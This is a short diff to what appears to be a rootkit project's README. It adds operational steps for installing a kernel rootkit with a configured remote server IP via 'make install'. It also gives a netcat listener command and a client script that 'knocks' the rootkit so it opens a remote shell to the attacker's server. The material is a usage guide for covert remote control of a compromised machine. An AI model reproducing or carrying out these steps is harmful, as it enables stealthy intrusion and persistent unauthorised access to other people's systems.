@@ -1,1 +1,7 @@
-* Listen for the shell:  nc -l -p 20000 -vvv
+* To install rootkit: configure remote server ip in Makefile (2nd argument when insmod-ing -> pk_ip=127.0.0.1) and
+					  execute: make install
+
+* In the remote server:
+	* listening for the shell:  nc -l -p 20000 -vvv
+	* knock to the rootkit so it provides the remote shell: configure the target_addr in conf_client_shell.py with rookit ip and
+															execute: python conf_client_shell.py
